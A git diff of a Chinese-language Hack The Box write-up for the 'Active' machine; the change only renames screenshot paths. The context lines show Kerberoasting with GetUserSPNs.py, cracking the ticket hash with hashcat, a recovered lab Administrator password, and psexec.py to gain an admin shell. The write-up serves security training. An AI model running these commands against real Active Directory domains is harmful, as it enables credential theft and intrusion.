@@ -154,7 +154,7 @@ serviceprincipalname | grep -B 1 servicePrincipalName
 python3 GetUserSPNs.py active.htb/SVC_TGS -dc-ip 10.129.138.113 -request
 ```
 
-<figure><img src="../../.gitbook/assets/25 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/25 (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * 将输出的哈希值存为hash.txt文件，然后用hashcat对它进行爆破以获取Administrator的明文密码：
 
@@ -162,11 +162,11 @@ python3 GetUserSPNs.py active.htb/SVC_TGS -dc-ip 10.129.138.113 -request
 hashcat -m 13100 hash.txt rockyou.txt
 ```
 
-<figure><img src="../../.gitbook/assets/26 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/26 (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/27 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/27 (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/28 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/28 (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * 此时已获得了管理员的明文密码<mark style="color:red;">**Ticketmaster1968，**</mark>配合psexec.py脚本获得管理员shell，成功root：
 
@@ -174,11 +174,11 @@ hashcat -m 13100 hash.txt rockyou.txt
 python3 psexec.py active.htb/Administrator@10.129.138.113 
 ```
 
-<figure><img src="../../.gitbook/assets/29 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/29 (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * 获得flag：
 
-<figure><img src="../../.gitbook/assets/30 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/30 (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
